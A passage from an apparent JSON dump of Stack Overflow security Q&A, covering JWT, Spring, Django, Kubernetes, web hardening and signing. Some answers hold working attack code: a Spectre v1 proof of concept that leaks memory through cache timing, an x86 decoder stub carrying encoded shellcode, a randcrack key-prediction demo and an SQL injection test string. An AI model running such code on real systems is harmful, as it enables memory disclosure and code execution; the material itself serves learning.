contract owner!\u00bb) from: 0xa329c0648769a73afac7f9381e08fb43dbea72\nUnique instructions: 1912\nUnique codehashes: 2\nCorpus size: 12\nSeed: 5517650708752309081",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-05-08T11:29:56",
        "author": "Matteo Gigli"
      },
      {
        "answer_id": 76202057,
        "body": "approve(address,uint256):  passed! \ud83c\udf89\ntoken2Address():  passed! \ud83c\udf89\ntoken2():  passed! \ud83c\udf89\naddLiquidity(address,uint256):  passed! \ud83c\udf89\ncheck_access_from_another_address_on_set_tokens_function():  passed! \ud83c\udf89\nowner():  passed! \ud83c\udf89\ngetSwapPrice(address,address,uint256):  passed! \ud83c\udf89\nsetTokens(address,address):  passed! \ud83c\udf89\ntoken1():  passed! \ud83c\udf89\ntoken1Address():  passed! \ud83c\udf89\nswap(address,address,uint256):  passed! \ud83c\udf89\nbalanceOf(address,address):  passed! \ud83c\udf89\nAssertionFailed(..):  passed! \ud83c\udf89\nUnique instructions: 3469\nUnique codehashes: 2\nCorpus size: 19\nSeed: 4335292047975925473",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2023-05-08T11:29:56",
        "author": "Matteo Gigli"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73177913/does-jwt-authorization-entirely-depend-upon-the-secret-key",
    "title": "Does JWT Authorization entirely depend upon the secret key?",
    "question_id": 73177913,
    "posted_date": "2022-07-30T13:55:57",
    "answers": [
      {
        "answer_id": 73201451,
        "body": "const jwt = require(\"jsonwebtoken\")\nconst jwtExpirySeconds = 600\nconst generate_token = (jwtKey, username) => {\n    const token = jwt.sign({ username }, jwtKey, {\n\t\talgorithm: \"HS256\",\n\t\texpiresIn: jwtExpirySeconds,\n\t})\n\tconsole.log(\"JWT token:\", token, '\\n')\n    const [header, payload, signature] = token.split(\".\")\n    console.log(\"1) header:\", header)\n    console.log(JSON.parse(Buffer.from(header, \"base64\").toString(\"utf8\")), '\\n')\n    console.log(\"2) payload:\", payload)\n    console.log(JSON.parse(Buffer.from(payload, \"base64\").toString(\"utf8\")), '\\n')\n    console.log(\"3) signature:\", signature)\n}\nconst my_args = process.argv.slice(2);\ngenerate_token(my_args[0], my_args[1]);",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2022-08-01T22:45:40",
        "author": "Bench Vue"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/72498147/getting-the-spring-security-jwt-login-sample-to-work-with-roles",
    "title": "Getting the Spring Security &quot;JWT Login Sample&quot; to work with roles",
    "question_id": 72498147,
    "posted_date": "2022-06-04T04:10:15",
    "answers": [
      {
        "answer_id": 72545570,
        "body": "public class RolesClaimConverter implements Converter<Jwt, AbstractAuthenticationToken> {\n\tprivate final JwtGrantedAuthoritiesConverter wrappedConverter;\n    public RolesClaimConverter(JwtGrantedAuthoritiesConverter conv) {\n        wrappedConverter = conv;\n    }\n\t@Override\n\tpublic AbstractAuthenticationToken convert(@NonNull Jwt jwt) {\n        // get authorities from wrapped converter\n\t\tvar grantedAuthorities = new ArrayList<>(wrappedConverter.convert(jwt));\n        // get role authorities\n\t\tvar roles = (List<String>) jwt.getClaims().get(\"roles\");\n\t\tif (roles != null) {\n\t\t\tfor (String role : roles) {\n\t\t\t\tgrantedAuthorities.add(new SimpleGrantedAuthority(\"ROLE_\" + role));\n\t\t\t}\n\t\t}\n\t\treturn new JwtAuthenticationToken(jwt, grantedAuthorities);\n\t}\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-06-08T08:17:51",
        "author": "Stefan Golubovi\u0107"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70802534/example-of-spectre-v1-on-new-cpu",
    "title": "Example of Spectre v1 on new CPU",
    "question_id": 70802534,
    "posted_date": "2022-01-21T09:00:21",
    "answers": [
      {
        "answer_id": 70814727,
        "body": "#define _CRT_SECURE_NO_WARNINGS\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#ifdef _MSC_VER\n#include <intrin.h> // \u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u043a\u044d\u0448\u0435\u043c win\n#else\n#include <x86intrin.h> //\u0440\u0430\u0431\u043e\u0442\u0430 \u0441 \u043a\u044d\u0448\u0435\u043c\n#endif\nconst unsigned int Time_To_Cashe = 160;\nunsigned int array1_size = 5;\nuint8_t trash[5] = { 1, 2, 3, 4, 5};// \u043c\u0443\u0441\u043e\u0440 \u0434\u043b\u044f \u0442\u0440\u0435\u043d\u0438\u0440\u043e\u0432\u043e\u043a\nuint8_t array2[256 * 512];\nuint8_t temp;\nvoid victim_function(size_t x) {//\u0430 \u0432\u043e\u0442 \u0438 \u0441\u0430\u043c \u0441\u043f\u0435\u043a\u0442\u0440\n  if (x < array1_size) {\n    temp = array2[trash[x] * 512];\n  }\n}\nuint8_t readMemoryByte(int cache_hit_threshold, size_t attack_x) {\n  int results[256] = {0};\n  int tries, i, max, sim;\n  size_t train_x, x;\n  register uint64_t Start, Time;\n  volatile uint8_t *rd;\n  for (tries = 500; tries > 0; tries--) {\n    for (i = 0; i < 256; i++)\n      _mm_clflush( & array2[i * 512]); //\u0443\u0434\u0430\u043b\u044f\u0435\u043c \u0438\u0437 \u043a\u044d\u0448\u0430 array2\n    /* \u0442\u0440\u0435\u043d\u0438\u0440\u0443\u043c 3 \u0440\u0430\u0437\u0430, \u043d\u0430 4\u0439 \u0430\u0442\u0430\u043a\u0443\u0435\u043c, \u043f\u043e\u0432\u0442\u043e\u0440\u044f\u0435\u043c 6 \u0440\u0430\u0437*/\n    train_x = tries % array1_size;\n    for (int j = 31; j >= 0; j--) {\n      _mm_clflush(&array1_size);\n      x = ((rand() + 1) * (j % 4)) % 4 - 1;\n      x = train_x ^ (x & (attack_x ^ train_x));// \u043f\u0440\u0438 i % 4 == 0 \u0430\u0442\u0430\u043a\u0443\u0435\u043c\n      victim_function(x);\n    }\n    for (i = 0; i < 256; i++) {\n      sim = rand() % 256; // \u0441\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u043e, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440 \u043d\u0435 \u0441\u043c\u043e\u0433 \u043e\u043f\u0442\u0438\u043c\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043a\u043e\u0434,\n      //\u043d\u0438\u0447\u0435\u0433\u043e \u0441\u0442\u0440\u0430\u0448\u043d\u043e\u0433\u043e \u0435\u0441\u043b\u0438 \u0447\u0442\u043e\u0442\u043e \u043c\u044b \u043f\u0440\u043e\u0447\u0442\u0435\u043c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0440\u0430\u0437 \u0438\u043b\u0438 \u043d\u0435 \u043f\u0440\u043e\u0447\u0442\u0435\u043c, \u0438\u0437-\u0437\u0430 \u0431\u043e\u043b\u044c\u0448\u043e\u0433\u043e tries \u043c\u044b \u0432 \u043b\u044e\u0431\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435\u0435 \u043f\u0440\u043e\u0447\u0442\u0435\u043c \u0432\u0441\u0435\n      rd = & array2[sim * 512];\n      Start = __rdtscp(rd); // \u0437\u0430\u043c\u0435\u0440\u044f\u0435\u043c \u0432\u0440\u0435\u043c\u044f \u0434\u043e\u0441\u0442\u0443\u043f\u0430\n      int tmp = *rd; //\u043e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c addr\n      Time = __rdtscp(rd) - Start;\n      if ((int)Time <= cache_hit_threshold && sim != trash[train_x]) // \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u0433\u0434\u0435 \u043d\u0430\u0445\u043e\u0434\u044f\u0442\u0441\u044f \u0434\u0430\u043d\u043d\u044b\u0435 \u0432 \u043a\u044d\u0448\u0435 \u0438\u043b \u0432 \u041e\u0417\u0423\n        results[sim]++; //\u0443\u0432\u0435\u043b\u0438\u0447\u0438\u0432\u0430\u0435\u043c \u0432\u0441\u0442\u0440\u0435\u0447\u0430\u0435\u043c\u043e\u0441\u0442\u044c \u0441\u0438\u043c\u0432\u043e\u043b\u0430\n    }\n    max = -1;\n    for (i = 0; i < 256; i++) {\n      if (max < 0 || results[i] >= results[max]) {\n        max = i;\n      }\n    }\n  }\n  return max;//\u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0441\u0438\u043c\u0432\u043e\u043b \u0441 \u043c\u0430\u043a\u0441 \u0447\u0430\u0441\u0442\u043e\u0442\u043e\u0439\n}\ninline void print(char c, FILE *out) {\n  if (out == NULL) {\n    printf(\"%c\", c);\n  }\n  else {\n    fprintf(out, \"%c\", c);\n  }\n}\nint main(int argc, char **argv) {\n  int cache_hit_threshold = Time_To_Cashe;\n  const char* secret = argv[1];\n  size_t malicious_x = (size_t)(secret - (char * ) trash);\n  int len = strlen(secret);\n  FILE* out = NULL;\n  if (argc == 3) {\n    out = fopen(argv[2], \"w\");\n  }\n  for (int i = 0; i < (int)sizeof(array2); i++) {\n    array2[i] = 1; // \u0437\u0430\u043f\u043e\u043b\u043d\u044f\u0435\u043c 1\u043c\u0438, \u0447\u0442\u043e\u0431\u044b \u0432 \u043e\u0437\u0443 \u043d\u0435 \u0431\u044b\u043b\u043e 0\n  }\n\n  while (--len >= 0) {//\u0441\u0447\u0438\u0442\u044b\u0432\u0430\u0435\u043c \u043f\u043e\u043f\u043e\u0440\u044f\u0434\u043a\u0443, \u043f\u043e 1 \u0431\u0443\u043a\u0432\u0435\n    int tmp = readMemoryByte(cache_hit_threshold, malicious_x++);\n    print(tmp, out);\n  }\n  if (out != NULL) {\n    fclose(out);\n  }\n  return 0;\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-01-22T11:15:41",
        "author": "taburetca"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70470995/intel-x86-ia32-assembly-decoder-stub-for-custom-encoder-not-working-as-expecte",
    "title": "Intel x86 (IA32) assembly decoder stub for custom encoder not working as expected",
    "question_id": 70470995,
    "posted_date": "2021-12-24T03:35:10",
    "answers": [
      {
        "answer_id": 70474945,
        "body": "global _start\nsection .text\n; initialize registers\n_start:\n        xor eax, eax\n        xor ebx, ebx\n        xor ecx, ecx\n        xor edx, edx\n        mov cl, 12\n        jmp short call_decoder\n; set starting address of Shellcode in esi register\ndecoder:\n        pop esi\n        mov edi, esi\n; first: decode by XOR again with same value 0xaa\ndecode1:\n        xor byte [edi], 0xaa\n        jz decode2\n        inc edi\n        jmp short decode1\n; second: rearrange the reversed adjacent BYTES, as part of encoding\ndecode2:\n        mov bl, byte [esi + eax]\n        mov dl, byte [esi + eax + 1]\n        xchg bl, dl\n        mov byte [esi + eax], bl\n        mov byte [esi + eax + 1], dl\n        add al, 2\n        loop decode2\n        jmp short Shellcode\ncall_decoder:\n        call decoder\n        Shellcode: db 0x6a,0x9b,0xc2,0xfa,0x85,0x85,0xd9,0xc6,0x85,0xc2,0xc3,0xc8,0x23,0xc4,0xfa,0x49,0x48,0x23,0x23,0xf9,0x1a,0x4b,0x67,0xa1,0x2a,0xaa",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-12-24T11:34:08",
        "author": "dig_123"
      },
      {
        "answer_id": 70474945,
        "body": "global _start\nsection .text\n_start:\n        xor eax, eax\n        xor ebx, ebx\n        xor ecx, ecx\n        jmp short call_decoder\ndecoder:\n        pop esi\n        mov cl, codeLen\n        dec cl\ndecode:\n        cmp al, cl\n        jz last_byte_odd\n        xor byte [esi + eax], 0xaa\n        mov bl, byte [esi + eax]\n        xor byte [esi + eax + 1], 0xaa\n        xchg byte [esi + eax + 1], bl\n        mov byte [esi + eax], bl\n        add al, 1\n        cmp al, cl\n        jz Shellcode\n        add al, 1\n        jmp short decode\nlast_byte_odd:\n        xor byte [esi + eax], 0xaa\n        jmp short Shellcode\ncall_decoder:\n        call decoder\n        Shellcode: db 0x6a,0x9b,0xc2,0xfa,0x85,0x85,0xd9,0xc6,0x85,0xc2,0xc3,0xc8,0x23,0xc4,0xfa,0x49,0x48,0x23,0x23,0xf9,0x1a,0x4b,0x67,0xa1,0x2a\n        codeLen         equ $-Shellcode",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-12-24T11:34:08",
        "author": "dig_123"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/70290835/how-to-disable-next-parameter-for-django-admin-to-avoid-page-enumeration-att",
    "title": "How to disable &quot;?next=&quot; parameter for Django Admin to avoid Page Enumeration Attacks?",
    "question_id": 70290835,
    "posted_date": "2021-12-09T08:34:32",
    "answers": [
      {
        "answer_id": 70290986,
        "body": "def admin_view(self, view, cacheable=False):\n        \"\"\"\n        Decorator to create an admin view attached to this ``AdminSite``. This\n        wraps the view and provides permission checking by calling\n        ``self.has_permission``.\n        You'll want to use this from within ``AdminSite.get_urls()``:\n            class MyAdminSite(AdminSite):\n                def get_urls(self):\n                    from django.urls import path\n                    urls = super().get_urls()\n                    urls += [\n                        path('my_view/', self.admin_view(some_view))\n                    ]\n                    return urls\n        By default, admin_views are marked non-cacheable using the\n        ``never_cache`` decorator. If the view can be safely cached, set\n        cacheable=True.\n        \"\"\"\n        def inner(request, *args, **kwargs):\n            if not self.has_permission(request):\n                if request.path == reverse('admin:logout', current_app=self.name):\n                    index_path = reverse('admin:index', current_app=self.name)\n                    return HttpResponseRedirect(index_path)\n                # Inner import to prevent django.contrib.admin (app) from\n                # importing django.contrib.auth.models.User (unrelated model).\n                from django.contrib.auth.views import redirect_to_login\n                return redirect_to_login(\n                    request.get_full_path(),\n                    reverse('admin:login', current_app=self.name),\n                    redirect_field_name=None # <-- Set this to None to disable the \"?next=\" parameter.\n                )\n            return view(request, *args, **kwargs)\n        if not cacheable:\n            inner = never_cache(inner)\n        # We add csrf_protect here so this function can be used as a utility\n        # function for any view, without having to repeat 'csrf_protect'.\n        if not getattr(view, 'csrf_exempt', False):\n            inner = csrf_protect(inner)\n        return update_wrapper(inner, view)",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-12-09T08:44:22",
        "author": "user8272359"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69887357/how-to-block-all-traffic-to-pods-matching-a-label-using-a-networkpolicy",
    "title": "How to block all traffic to pods matching a label using a NetworkPolicy",
    "question_id": 69887357,
    "posted_date": "2021-11-08T12:13:45",
    "answers": [
      {
        "answer_id": 69899258,
        "body": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nginx\n  replicas: 2 # tells deployment to run 2 pods matching the template\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.14.2\n        ports:\n        - containerPort: 80\n---\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx-service\nspec:\n  type: NodePort\n  selector:\n    app: nginx\n  ports:\n    - protocol: TCP\n      port: 80\n      targetPort: 80\n      nodePort: 30000",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-11-09T08:44:27",
        "author": "Mikolaj S."
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/69545920/how-to-add-unauthorized-www-authenticate-field-to-response-header-using-micronau",
    "title": "How to add unauthorized WWW-Authenticate field to response header using Micronaut Security?",
    "question_id": 69545920,
    "posted_date": "2021-10-12T15:18:24",
    "answers": [
      {
        "answer_id": 69581076,
        "body": "@Filter(\"/**\")\nclass AuthenticateHeaderFilter extends OncePerRequestHttpServerFilter {\n    @Override\n    protected Publisher<MutableHttpResponse<?>> doFilterOnce(HttpRequest<?> request, ServerFilterChain chain) {\n        return Publishers.map(chain.proceed(request)) { response ->\n            if (response.status() == HttpStatus.UNAUTHORIZED) {\n                response.header(HttpHeaders.WWW_AUTHENTICATE, \"Basic realm=\\\"my realm\\\"\")\n            }\n            return response\n        }\n    }\n    @Override\n    int getOrder() {\n        return Integer.MIN_VALUE\n    }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-10-15T03:09:54",
        "author": "Sascha Frinken"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68802741/why-isnt-random-randbytes-secure-if-the-seed-can-be-both-time-or-entropy-from",
    "title": "Why isn&#39;t random.randbytes() secure if the seed can be both time or entropy from /dev/urandom?",
    "question_id": 68802741,
    "posted_date": "2021-08-16T08:21:57",
    "answers": [
      {
        "answer_id": 68803057,
        "body": "import random, os\nfrom randcrack import RandCrack\ndef create_keys():\n    random.seed(os.urandom(10000))\n    public_key = [random.getrandbits(32) for _ in range(624)]\n    private_key = [random.getrandbits(32) for _ in range(624)]\n    return public_key, private_key\ndef crack(public_key):\n    rc = RandCrack()\n    for x in public_key:\n        rc.submit(x)\n    cracked_private_key = [rc.predict_getrandbits(32) for _ in range(624)]\n    return cracked_private_key\ndef demo():\n    cracked = 0\n    for attempt in range(1, 101):\n        public_key, private_key = create_keys()\n        cracked += crack(public_key) == private_key\n        print(cracked, 'out of', attempt, 'private keys cracked')\ndemo()",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-08-16T08:44:45",
        "author": "Kelly Bundy"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68301633/symfony-4-4-security-session-is-saved-but-not-used",
    "title": "Symfony 4.4 Security / Session is saved but not used",
    "question_id": 68301633,
    "posted_date": "2021-07-08T08:27:30",
    "answers": [
      {
        "answer_id": 68392065,
        "body": "security:\n    encoders:\n        App\\Entity\\User:\n            algorithm: auto\n    role_hierarchy:\n        ROLE_USER : \"ROLE_USER\"\n        ROLE_ADMIN : \"ROLE_ADMIN\"\n        ROLE_SUPERADMIN : \"ROLE_SUPERADMIN\"\n    providers:\n        entity_provider:\n            entity:\n                class: App\\Entity\\User\n                property: username\n    firewalls:\n        dev:\n            pattern: ^/(_(profiler|wdt)|css|images|js)/\n            security: false\n        main:\n            anonymous: true\n            guard:\n                entry_point: lexik_jwt_authentication.jwt_token_authenticator\n                authenticators:\n                    - App\\Security\\SecurityAuthenticator\n                    - lexik_jwt_authentication.jwt_token_authenticator\n            logout:\n                path: app_logout\n            json_login:\n                check_path: /login_check\n                success_handler: lexik_jwt_authentication.handler.authentication_success\n                failure_handler: lexik_jwt_authentication.handler.authentication_failure\n        login:\n            pattern:  ^/login\n            stateless: true\n            anonymous: true\n            json_login:\n                check_path: /login_check\n                success_handler: lexik_jwt_authentication.handler.authentication_success\n                failure_handler: lexik_jwt_authentication.handler.authentication_failure\n        docs:\n            pattern:  ^/docs\n            stateless: true\n            anonymous: true\n        api:\n            pattern:  ^/api\n            stateless: true\n            anonymous: false\n            provider: entity_provider\n            guard:\n                authenticators:\n                    - lexik_jwt_authentication.jwt_token_authenticator\n        secured:\n            pattern: ^/secured\n            anonymous: false\n            guard:\n                authenticators:\n                    - App\\Security\\SecurityAuthenticator\n            logout:\n                path: app_logout\n    access_control:\n        - { path: ^/login, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n        - { path: ^/register, roles: IS_AUTHENTICATED_ANONYMOUSLY }\n        - { path: ^/api, roles: IS_AUTHENTICATED_FULLY  }\n        - { path: ^/docs, roles: IS_AUTHENTICATED_ANONYMOUSLY  }\n        - { path: ^/secured, roles: IS_AUTHENTICATED_FULLY  }",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-07-15T06:24:13",
        "author": "Issac411"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/68094494/is-it-safe-to-store-public-keys-policies-in-a-node-js-constant-in-lambda",
    "title": "Is it safe to store public keys/policies in a node.js constant in Lambda",
    "question_id": 68094494,
    "posted_date": "2021-06-23T02:18:56",
    "answers": [
      {
        "answer_id": 68095430,
        "body": "const { SSMClient, GetParameterCommand } = require(\"@aws-sdk/client-ssm\");\n// This only happens once, when the Lambda is started for the first time:\nconst init = async () => {\n    const config = {}\n    try {\n        // use whatever 'paramName' you defined, when you created the SSM parameter\n        const paramName = \"/azure/publickey\"\n        const command = new GetParameterCommand({Name: paramName});\n        const ssm = new SSMClient();\n        const data = await ssm.send(command);\n        config[\"publickey\"] = data.Parameter.Value;\n    } catch (error) {\n        return Promise.reject(new Error(\"unable to read SSM parameter '\"+ paramName + \"'.\"));\n    }\n    return new Promise((resolve, reject) => {\n        resolve(config);\n        reject(new Error(\"unable to create configuration. Unknown error.\"));\n    });\n};\nconst initPromise = init();\nexports.handler = async (event) => {\n    const config = await initPromise;\n    console.log(\"My public key '%s'\", config.key);\n    return \"Hello World\";\n};",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-06-23T03:30:34",
        "author": "Jens"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/67641428/python-error-while-scraping-microsoft-cve-webpage",
    "title": "Python Error while Scraping Microsoft CVE Webpage",
    "question_id": 67641428,
    "posted_date": "2021-05-21T13:28:39",
    "answers": [
      {
        "answer_id": 67642044,
        "body": "Microsoft PowerPoint Remote Code Execution Vulnerability\nA remote code execution vulnerability exists in Microsoft PowerPoint software when the software fails to properly validate XML content. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.Exploitation of the vulnerability requires that a user open a specially crafted file with an affected version of Microsoft Office PowerPoint software. In an email attack scenario, an attacker could exploit the vulnerability by sending the specially crafted file to the user and convincing the user to open the file. In a web-based attack scenario, an attacker could host a website (or leverage a compromised website that accepts or hosts user-provided content) that contains a specially crafted file designed to exploit the vulnerability. An attacker would have no way to force users to visit the website. Instead, an attacker would have to convince users to click a link, typically by way of an enticement in an email or instant message, and then convince them to open the specially crafted file. After the file is open, the user would need to move their mouse over a specific location on the page within the PowerPoint file to trigger the vulnerability.Note that the Preview Pane is not an attack vector for this vulnerability. The security update addresses the vulnerability by correcting how Microsoft PowerPoint handles objects in memory.",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-05-21T14:14:51",
        "author": "Andrej Kesely"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65991811/is-this-methods-enough-for-secure-my-host-php",
    "title": "is this methods enough for secure my host (php)?",
    "question_id": 65991811,
    "posted_date": "2021-02-01T06:21:03",
    "answers": [
      {
        "answer_id": 65992595,
        "body": "$conn = mysqli_connect(\"localhost\", \"username\", \"password\", \"database\");\n$username = \"someone\";\n$comments = \"something like ); SELECT * FROM table;\"; #some kind of sql injection\n$current_date = date(\"h:i:s a d-m-Y\");\n        $sql = \"INSERT INTO comments (name, comments, date_publish) VALUES (?, ?, ?);\";\n        $stmt = mysqli_stmt_init($conn);\n        if (!mysqli_stmt_prepare($stmt, $sql)) {\n            echo \"An error occured!\";\n        } else {\n            mysqli_stmt_bind_param($stmt, \"sss\", $username, $comment, $current_date);\n            mysqli_stmt_execute($stmt);\n            mysqli_stmt_get_result($stmt);\n            echo \"Done!\";\n        }",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-02-01T07:17:28",
        "author": "Example person"
      },
      {
        "answer_id": 65992595,
        "body": "<IfModule headers_module>\nHeader always set Expires \"-1\"\nHeader always set Cache-Control \"no-store, no-cache, must-revalidate, max-age=0\"\nHeader always set Pragma \"no-cache\"\n<FilesMatch \"\\.(gif|jpe?g|png|webp|ico|mp4|mp3)$\">\nHeader always unset Expires\nHeader always set Cache-Control \"must-revalidate, max-age=3600\"\nHeader always unset Pragma\n</FilesMatch>\nHeader always set Content-Security-Policy \"default-src 'none'; img-src data: https: 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; style-src 'self'; base-uri 'none'; form-action 'self'; media-src https: 'self'; frame-src 'none'; child-src 'none'; connect-src 'self'\"\nHeader always set X-Frame-Options \"DENY\"\nHeader always set X-XSS-Protection \"1; mode=block\"\nHeader always set X-Content-Type-Options nosniff\nHeader always set Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" \"expr=%{HTTPS} == 'on'\"\n#Header always set Referrer-Policy \"no-referrer\"\nHeader always set Permissions-Policy \"geolocation=();midi=();notifications=();push=();sync-xhr=(self);microphone=();camera=();magnetometer=();gyroscope=();speaker=(self);vibrate=();fullscreen=(self);payment=();\"\nHeader always set X-Permitted-Cross-Domain-Policies \"none\"\n</IfModule>",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-02-01T07:17:28",
        "author": "Example person"
      },
      {
        "answer_id": 65992595,
        "body": "set-cookie: __Secure-YOURSESSID=abcdefghijklmnopqrstuvwxyz123456789; path=/; secure; HttpOnly; SameSite=Lax\nexpires: -1\ncache-control: no-store, no-cache, must-revalidate, max-age=0\npragma: no-cache\ncontent-security-policy: default-src 'none'; img-src data: https: 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; style-src 'self'; base-uri 'none'; form-action 'self'; media-src https: 'self'; frame-src 'none'; child-src 'none'; connect-src 'self'\nx-frame-options: DENY\nx-xss-protection: 1; mode=block\nx-content-type-options: nosniff\nstrict-transport-security: max-age=63072000; includeSubDomains; preload\npermissions-policy: geolocation=();midi=();notifications=();push=();sync-xhr=(self);microphone=();camera=();magnetometer=();gyroscope=();speaker=(self);vibrate=();fullscreen=(self);payment=();\nx-permitted-cross-domain-policies: none\ncontent-type: text/html; charset=UTF-8",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-02-01T07:17:28",
        "author": "Example person"
      },
      {
        "answer_id": 65992595,
        "body": "SSLCipherSuite TLSv1.3 TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nSSLCipherSuite ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA384\nSSLOpenSSLConfCmd ECDHParameters secp384r1\n#generate DH param using: openssl dhparam -out dhparam.pem 4096\nSSLOpenSSLConfCmd DHParameters \"/path/to/ssl/dh4096.pem\"\nSSLHonorCipherOrder On\nSSLProtocol -all +TLSv1.2 +TLSv1.3\nSSLPassPhraseDialog builtin\nSSLSessionCache \"shmcb:/usr/local/apache2/logs/ssl_scache(512000)\"\nSSLSessionCacheTimeout 300\nSSLUseStapling On\nSSLStaplingCache \"shmcb:ssl_stapling(32768)\"",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2021-02-01T07:17:28",
        "author": "Example person"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/65469799/pdfbox-how-to-incrementally-sign-updated-document-or-changes",
    "title": "pdfbox - How to incrementally sign updated document or changes",
    "question_id": 65469799,
    "posted_date": "2020-12-27T14:48:30",
    "answers": [
      {
        "answer_id": 65567683,
        "body": "PDDocument document = ...;\nPDImageXObject image = ...;\nOutputStream result = ...;\nPDAppearanceStream appearanceStream = new PDAppearanceStream(document);\nappearanceStream.setBBox(new PDRectangle(1, 1));\nappearanceStream.setResources(new PDResources());\ntry (   PDPageContentStream contentStream = new PDPageContentStream(document, appearanceStream) ) {\n    contentStream.drawImage(image, new Matrix());\n}\nPDAppearanceDictionary appearance = new PDAppearanceDictionary();\nappearance.setNormalAppearance(appearanceStream);\nPDAnnotationRubberStamp stamp = new PDAnnotationRubberStamp();\nstamp.setLocked(true);\nstamp.setLockedContents(true);\nstamp.setPrinted(true);\nstamp.setReadOnly(true);\nstamp.setAppearance(appearance);\nstamp.setIntent(\"StampImage\");\nstamp.setRectangle(new PDRectangle(200, 500, 100, 100));\nPDPage page = document.getPage(0);\npage.getAnnotations().add(stamp);\nSet<COSDictionary> objectsToWrite = new HashSet<>();\nobjectsToWrite.add(page.getCOSObject());\ndocument.saveIncremental(result, objectsToWrite);",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-01-04T13:11:37",
        "author": "mkl"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61776584/how-to-generate-an-internally-detached-xml-signature-in-java",
    "title": "How to generate an internally-detached XML signature in Java",
    "question_id": 61776584,
    "posted_date": "2020-05-13T09:57:09",
    "answers": [
      {
        "answer_id": 61779144,
        "body": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.xml.sax.InputSource;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Node;\nimport org.w3c.dom.NodeList;\nimport java.io.StringReader;\nimport javax.xml.transform.TransformerFactory;\nimport javax.xml.transform.Transformer;\nimport javax.xml.transform.OutputKeys;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.transform.stream.StreamResult;\nimport java.io.StringWriter;\n...\nString signatureXml = GenDetached.generate();\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\n// My test document to hold the data and the signature:\nString xmlString = \"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\" standalone=\\\"no\\\"?><root><data>foo</data></root>\";\nDocument doc = db.parse(new InputSource(new StringReader(xmlString)));\nNode docRootNode = doc.getFirstChild();\nDocument sig = db.parse(new InputSource(new StringReader(signatureXml)));\nNodeList sigNodeList = sig.getElementsByTagName(\"Signature\");\nNode sigNode = sigNodeList.item(0);\n\n// First import the signature node into the main document:\nNode docImportedNode = doc.importNode(sigNode, true);\n// Then add the signature node to the main document's root:\ndocRootNode.appendChild(docImportedNode);\n\n// Show the output (as a String in this case, for the demo):\nTransformerFactory tf = TransformerFactory.newInstance();\nTransformer trans = tf.newTransformer();\ntrans.setOutputProperty(OutputKeys.INDENT, \"yes\");\nStringWriter writer = new StringWriter();\ntrans.transform(new DOMSource(doc), new 